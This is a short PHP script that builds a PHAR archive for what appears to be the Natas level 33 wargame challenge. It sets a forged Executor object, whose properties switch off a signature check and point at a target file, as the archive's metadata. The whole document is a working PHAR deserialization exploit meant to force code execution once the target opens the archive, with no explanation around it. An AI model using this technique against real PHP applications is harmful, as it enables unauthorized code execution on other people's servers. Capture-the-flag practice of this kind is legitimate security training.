<?php
	class Executor {
		private $filename = "natas33.php"; 
        private $signature = True;
        private $init = false;
	}

	$phar = new Phar("natas33.phar");
	$phar->startBuffering();
	$phar->addFromString("test.txt", 'test');
	$phar->setStub("<?php __HALT_COMPILER(); ?>");
	$o = new Executor();
	$phar->setMetadata($o);
	$phar->stopBuffering();
?>